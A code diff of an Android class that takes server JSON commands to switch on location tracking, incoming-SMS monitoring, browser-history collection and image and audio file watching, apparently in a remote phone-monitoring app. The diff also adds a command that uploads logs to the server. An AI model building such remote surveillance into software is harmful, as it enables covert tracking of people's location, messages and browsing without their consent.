@@ -14,7 +14,7 @@ import android.preference.PreferenceManager;
 import com.inet.android.bs.ServiceControl;
 import com.inet.android.info.DeviceInformation;
 import com.inet.android.list.TurnSendList;
-import com.inet.android.sms.SmsSentObserver;
+import com.inet.android.message.SmsSentObserver;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.ValueWork;
 
@@ -77,7 +77,7 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null && str.length() > 3)
 			getRequestData(str);
 		else {
-			ParsingErrors.setError(str, "",
+			DisassemblyErrors.setError(str, "",
 					ConstantValue.TYPE_PERIODIC_REQUEST, -1, "", -1, mContext);
 			Logging.doLog(LOG_TAG, "ответа от сервера нет",
 					"ответа от сервера нет");
@@ -135,7 +135,7 @@ public class PeriodicRequest extends DefaultRequest {
 
 		// ----------------errors-----------------
 		if (str.equals("0")) {
-			ParsingErrors.setError(response, mContext);
+			DisassemblyErrors.setError(response, mContext);
 			return;
 		}
 
@@ -150,23 +150,8 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("period", "1");
 			ed.commit();
 		}
-
-		// ----------frequency location 0 - off ------------
-		try {
-			str = jsonObject.getString("geo");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ValueWork.changeValueMethod(
-					ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, str, mContext);
-			ed.putString("geo", str);
-		} else {
-			ed.putString("geo", "0");
-		}
-
 		/*
-		 * positioning mode 0 - network, 1 - gps ---------
+		 * ---- positioning mode 0 - network, 1 - gps ----
 		 */
 		try {
 			str = jsonObject.getString("geo_mode");
@@ -176,9 +161,20 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null) {
 			ValueWork.changeValueMethod(ConstantValue.LOCATION_TRACKER_MODE,
 					str, mContext);
-			ed.putString("geo_mode", str);
 		} else {
 			ed.putString("geo_mode", "0");
+		}
+		// ----------frequency location 0 - off ------------
+		try {
+			str = jsonObject.getString("geo");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ValueWork.changeValueMethod(
+					ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, str, mContext);
+		} else {
+			ed.putString("geo", "0");
 		}
 
 		// -----------monitoring sms----------------
@@ -190,7 +186,6 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null) {
 			ValueWork.changeValueMethod(
 					ConstantValue.TYPE_INCOMING_SMS_REQUEST, str, mContext);
-			ed.putString("sms", str);
 		} else {
 			ed.putString("sms", "0");
 		}
@@ -216,7 +211,6 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null) {
 			ValueWork.changeValueMethod(
 					ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, str, mContext);
-			ed.putString("www", str);
 		} else {
 			ed.putString("www", "0");
 		}
@@ -338,11 +332,9 @@ public class PeriodicRequest extends DefaultRequest {
 		} catch (JSONException e) {
 			str = null;
 		}
-		if (image != null)
-			ed.putString("image", image);
-		if (audio != null)
-			ed.putString("audio", audio);
-
+		if (image != null && audio != null)
+			ValueWork.setValueFileObserverService(audio, image, mContext);
+		
 		// ----------------method of sending files----------------------
 		try {
 			str = jsonObject.getString("dispatch");
@@ -405,8 +397,17 @@ public class PeriodicRequest extends DefaultRequest {
 				TurnSendList.setList(ConstantValue.TYPE_LIST_APP,
 						Integer.parseInt(str), null, mContext);
 			}
+		// --------------log file------------------------
+		try {
+			str = jsonObject.getString("log");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			if (str.equals("1")) {
+				Logging.sendLogFileToServer(mContext);
+			}
 		ed.commit();
-		ServiceControl.trackerStateService(mContext);
 	}
 
 	@Override
